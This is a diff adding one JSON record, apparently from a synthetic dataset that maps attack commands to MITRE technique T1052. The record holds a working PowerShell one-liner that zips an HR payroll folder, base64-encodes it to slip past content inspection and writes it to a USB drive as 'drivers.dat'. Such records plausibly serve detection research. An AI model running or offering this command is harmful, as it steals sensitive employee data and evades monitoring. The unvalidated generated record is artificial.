@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $zip=Join-Path $env:TEMP 'sdata.zip'; Compress-Archive -Path 'C:\\HR\\Payroll' -DestinationPath $zip -Force; [Convert]::ToBase64String([IO.File]::ReadAllBytes($zip)) | Out-File -Encoding ASCII (Join-Path $usb 'drivers.dat')",
+  "explanation": "Compresses sensitive files and writes a base64-encoded archive to the first detected removable drive.",
+  "rationale_steps": [
+    "Identify first removable drive letter",
+    "Compress local target data",
+    "Base64-encode to evade simple content inspection",
+    "Write encoded payload to USB device"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-b5822822",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
